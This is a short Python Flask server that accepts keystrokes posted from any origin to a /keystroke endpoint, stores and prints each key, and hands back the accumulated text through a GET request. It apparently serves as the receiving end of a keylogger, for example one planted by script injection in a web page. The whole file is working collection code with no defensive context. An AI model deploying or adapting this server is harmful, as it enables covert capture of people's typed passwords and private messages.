from flask import Flask, request
from flask_cors import CORS, cross_origin
import time

app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'
keystrokes = []

@app.route('/keystroke', methods=['POST'])
@cross_origin()
def log_keystroke():
    global keystrokes
    data = request.json
    print(f"Key: {data['key']} {time.time()}")
    if 'key' in data:
        keystrokes.append(data['key'])
    return '', 204

@app.route('/keystroke', methods=['GET'])
@cross_origin()
def get_keystrokes():
    global keystrokes
    some_name = ''.join(keystrokes)
    keystrokes = []
    return some_name

if __name__ == '__main__':
    app.run(port=8080)